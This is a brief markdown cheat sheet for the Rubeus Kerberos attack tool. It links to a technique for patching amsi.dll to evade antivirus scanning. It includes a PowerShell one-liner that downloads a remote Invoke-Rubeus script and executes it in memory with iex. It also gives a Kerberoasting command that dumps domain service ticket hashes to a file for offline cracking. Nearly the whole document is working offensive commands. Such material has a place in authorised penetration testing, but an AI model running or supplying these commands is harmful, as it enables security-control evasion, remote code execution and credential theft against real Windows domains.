# Reference
- [Rubeus](https://github.com/GhostPack/Rubeus)

# Add to PowerShell
- [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/okazymyrov/piki/master/Invoke-Rubeus.ps1')
```

# Commands

## Kerberoast
```powershell
Invoke-Rubeus 'kerberoast /outfile:hashes.txt /user:USER /domain:DOMAIN /dc:DOMAIN_CONTROLLER'
```
